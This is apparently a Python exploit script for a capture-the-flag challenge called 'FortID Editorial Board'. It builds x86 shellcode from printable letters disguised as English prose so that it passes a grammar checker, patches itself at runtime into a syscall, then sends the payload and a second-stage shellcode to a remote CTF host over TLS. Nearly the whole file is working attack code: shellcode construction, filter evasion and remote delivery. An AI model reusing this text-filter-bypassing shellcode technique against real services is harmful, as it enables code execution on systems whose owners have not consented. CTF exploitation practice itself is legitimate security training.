#!/usr/bin/env python3
"""FortID Editorial Board: grammar-safe Stage9 using a four-op b90.

Run beside validate.py and editorial_stage8_native_accepted.txt.
Requirements: language_tool_python, the original local CTF setup.
"""
from pathlib import Path
from itertools import permutations, combinations, product
import argparse, json, importlib.util, subprocess, sys, ssl, socket, time, struct

ALLOWED=set(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz .,;:'-?!")
SKIP=b' A clear voice guided the guests through an odd afternoon.'
MARK=b'\n[STAGE9_NATIVE_SHORTTOKENS_OK]\n'


def b90_candidates():
    """R=push edx(0), AA=inc ecx twice, B=inc edx(1).
    3 harmless CS prefixes fill seven bytes and separate LT words.
    """
    preferred=[b'.R.AA.B',b'.R.A.BA',b'.RA.A.B',b'.R.AAB.',b'.R.AA.B']
    seen=set()
    for v in preferred:
        if len(v)==7 and v not in seen:
            seen.add(v);yield v
    for ops in sorted(set(permutations('RAAB'))):
        if ops.index('R')>ops.index('B'):continue
        for slots in combinations(range(5),3):
            v=''.join(('.' if j in slots else '')+(ops[j] if j<4 else '') for j in range(5)).encode()
            if v not in seen:
                seen.add(v);yield v


def build(baseline,starter,subword,b90):
    assert len(b90)==7
    assert starter[0] in 'aS' and len(starter)==5 and starter[-1] in 'rux'
    assert len(subword)==4 and subword[0]==('r' if starter[0]=='S' else 'd')
    tail=b' E' if starter[0]=='S' else b'.E'
    b101=b'BB.R.X.js.Z.AA'  # already mechanically checked in Stage 9
    code=(b' AJ AR AZ-'+starter.encode()+b':'+SKIP+b' As-'+subword.encode()
          +b' At.AA.G Ab'+b90+b' '+b101+tail)
    assert len(code)==117,(len(code),code)
    assert code[74:77]==b' As' and code[82:85]==b' At'
    assert code[90:93]==b' Ab' and code[100]==32 and code[115:117]==tail
    # Stage 9 working writer and reader emulation. Branch lands at +74,
    # so CS at +73 is skipped; no CS precedes writes at +74,+82,+90.
    modified=bytearray(code)
    for pos in (74,82,90):modified[pos]=0
    al=(-ord(starter[0]))&255
    modified[115]=(modified[115]+al)&255
    al=(al-ord(subword[0]))&255
    modified[116]=(modified[116]+al)&255
    modified[100]=(modified[100]+al)&255
    assert modified[100]==0x5b and modified[115:117]==b'\xcd\x80'
    assert modified[90:93]==b'\x00Ab' # no CS on third write
    # Start before b90: eax=0x3b, edx=0, ecx advanced twice.
    # b90 contains only R A A B (prefixes are harmless on register ops).
    ops=b90.replace(b'.',b'')
    assert len(ops)==4 and sorted(ops)==sorted(b'RAAB')
    assert ops.index(ord('R')) < ops.index(ord('B'))
    # eDX0 saved, ECX+2, EDX1; POP EBX(+100) reads saved zero.
    # BB: EDX3; R.X: EAX3; js.Z: EDX115; AA: ECX+2.
    assert modified[100:117]==bytes.fromhex('5b 42 42 2e 52 2e 58 2e 6a 73 2e 5a 2e 41 41 cd 80')
    message=baseline[:609]+code+baseline[726:]
    assert len(message)==899 and message[605:609]==b'able'
    assert all(c in ALLOWED for c in message)
    return message,bytes(modified)


def score(data,lt,val):
    info,err=val.structural(data.decode('ascii'))
    if err:return dict(ok=False,score=0,reason=str(err))
    s,words,sents,repeat,avg=info
    ms=lt.check(s)
    sp=sum(val.is_spelling(m) for m in ms)
    density=100*len(ms)/len(words)
    mark=round(max(0,min(100,100-5*density-1000*sp/len(words)-55*repeat-max(0,avg-24)*.6)),2)
    return dict(ok=(sp==0 and density<=2.2 and mark>=88),score=mark,
                spelling=sp,issues=len(ms),words=len(words),repeat=round(repeat,4),
                matches=[(getattr(m,'rule_id',getattr(m,'ruleId','')),m.offset) for m in ms])


def marker_stage2():
    body=(b'\x59\xba'+struct.pack('<I',len(MARK))+b'\x6a\x01\x5b\x6a\x04\x58\xcd\x80'
          +b'\x31\xdb\x6a\x01\x58\xcd\x80')
    core=b'\xeb'+bytes([len(body)])+body+b'\xe8'+struct.pack('<i',-len(body)-5)+MARK
    assert len(core)<=111
    # EIP resumes at +117. Payload begins +6: EB 8F returns to +6.
    result=core+b'\x90'*(111-len(core))+b'\xeb\x8f\x90\x90'
    assert len(result)==115
    return result


def remote(host,port,article,stage2,mode,timeout,label):
    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
    start=time.monotonic();output=bytearray();sent=False;sent2=False
    try:
        with socket.create_connection((host,port),timeout=15) as sock:
            with ctx.wrap_socket(sock,server_hostname=host) as s:
                s.settimeout(1.2)
                while time.monotonic()-start<timeout:
                    try:p=s.recv(8192)
                    except socket.timeout:continue
                    if not p:break
                    output.extend(p)
                    print('RX',mode,round(time.monotonic()-start,2),repr(p[:250]),flush=True)
                    if not sent and b'Submit your manuscript:' in output:
                        s.sendall(article+b'\n'+(stage2 if mode=='joint' else b''))
                        sent=True;sent2=(mode=='joint');print('TX 900',mode,'stage2',sent2,flush=True)
                    if sent and not sent2 and b'The board is reviewing' in output:
                        s.sendall(stage2);sent2=True;print('TX stage2 review',flush=True)
    except (OSError,ssl.SSLError) as e: print('Network',repr(e))
    file=Path('editorial_shorttokens_'+label+'_'+mode+'.raw')
    file.write_bytes(output)
    found=MARK in output
    print('REMOTE',label,mode,'marker',found,'accepted',b'Accepted by the anti-slop desk' in output,
          'rx',len(output),'saved',file)
    return found


def main():
    p=argparse.ArgumentParser(description=__doc__)
    p.add_argument('--baseline',default='editorial_stage8_native_accepted.txt')
    p.add_argument('--host',default='editorial-board-0af55b94bb8f.inst2.ctf.fortid.com')
    p.add_argument('--port',type=int,default=1337)
    p.add_argument('--limit',type=int,default=400)
    p.add_argument('--deadline',type=float,default=85)
    p.add_argument('--no-remote',action='store_true')
    p.add_argument('--static-only',action='store_true',help='Build a candidate without LanguageTool')
    a=p.parse_args()
    baseline=Path(a.baseline).read_bytes();assert len(baseline)==899 and baseline[605:609]==b'able'
    options=list(b90_candidates())
    print('b90 options',len(options),'first',options[:8],flush=True)
    words=[('Sugar','rain'),('Sober','rain'),('Super','rain'),('Saber','rain'),('Savor','rain'),
           ('Solar','rain'),('Sugar','rose'),('after','dawn'),('anger','dawn')]
    if a.static_only:
        article,patched=build(baseline,'Sugar','rain',options[0])
        Path('editorial_shorttokens_preview.txt').write_bytes(article)
        Path('editorial_shorttokens_patched.bin').write_bytes(patched)
        print('Static candidate written; NOT validated by LanguageTool');return
    import language_tool_python
    spec=importlib.util.spec_from_file_location('editorial_validator',Path('validate.py').resolve())
    val=importlib.util.module_from_spec(spec);sys.modules[spec.name]=val;spec.loader.exec_module(val)
    lt=language_tool_python.LanguageTool('en-US')
    records=[];winner=None
    try:
        for idx in range(a.limit):
            b90=options[(idx//len(words))%len(options)]
            st,sw=words[idx%len(words)]
            article,patched=build(baseline,st,sw,b90)
            result=score(article,lt,val)
            result.update(starter=st,subword=sw,b90=b90.decode())
            records.append(result)
            print(idx,'ACCEPT' if result['ok'] else 'REJECT',result['score'],
                  'spelling',result['spelling'],'issues',result['issues'],st,b90,flush=True)
            if winner is None or (result['ok'],result['score'])>(winner[0]['ok'],winner[0]['score']):
                winner=(result,article,patched)
            if result['ok']:break
    finally:
        if hasattr(lt,'close'):lt.close()
    Path('editorial_shorttokens_scores.json').write_text(json.dumps(records,indent=2))
    info,article,patched=winner
    Path('editorial_shorttokens_candidate.txt').write_bytes(article)
    Path('editorial_shorttokens_patched.bin').write_bytes(patched)
    print('BEST',json.dumps(info,indent=2))
    if not info['ok']:
        print('NO ACCEPT: no connection made');return
    r=subprocess.run([sys.executable,'validate.py','--json','editorial_shorttokens_candidate.txt'],
                     capture_output=True,text=True,timeout=180)
    print('INDEPENDENT VALIDATOR',r.returncode,r.stdout[:1200],r.stderr[:300])
    if r.returncode!=0:
        print('Independent validator rejected: NO REMOTE');return
    second=marker_stage2();Path('editorial_shorttokens_stage2.bin').write_bytes(second)
    print('ACCEPT; stage2 length',len(second),'starting remote' if not a.no_remote else 'local only')
    if a.no_remote:return
    for mode in ('joint','reviewing'):
        if remote(a.host,a.port,article,second,mode,a.deadline,'probe'):
            print('REMOTE STAGE2 SUCCESS');return
    print('STAGE2 marker not observed remotely; inspect raw reports')

if __name__=='__main__':main()
